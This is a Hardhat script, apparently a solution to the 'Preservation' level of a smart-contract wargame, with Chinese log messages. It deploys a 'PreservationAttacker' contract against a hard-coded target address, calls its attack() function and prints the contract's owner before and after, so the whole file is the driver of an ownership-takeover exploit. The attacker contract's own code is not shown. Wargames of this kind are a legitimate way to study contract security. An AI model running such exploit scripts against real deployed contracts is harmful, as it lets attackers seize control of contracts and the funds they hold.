import hre from "hardhat";
const { ethers } = hre;

// Change your target address
const CONTRACT_ADDRESS = "0x54058aA94F43E509Ad7B3D305aF9d612133f7907";

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);

    const preservation = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS);
    console.log("Preservation 關卡實例地址: ", CONTRACT_ADDRESS);
    console.log("目前的 Preservation owner: ", await preservation.owner());

    // =========進攻開始===========
    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
    const preservationAttacker = await PreservationAttacker.deploy(CONTRACT_ADDRESS);
    await preservationAttacker.waitForDeployment();
      
    console.log("PreservationAttacker Contract deployed to: ", await preservationAttacker.getAddress());
    console.log("目前的 PreservationAttacker owner: ", await preservationAttacker.owner());
    
    const tx = await preservationAttacker.attack();
    await tx.wait();

    console.log("目前的 Preservation owner: ", await preservation.owner());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });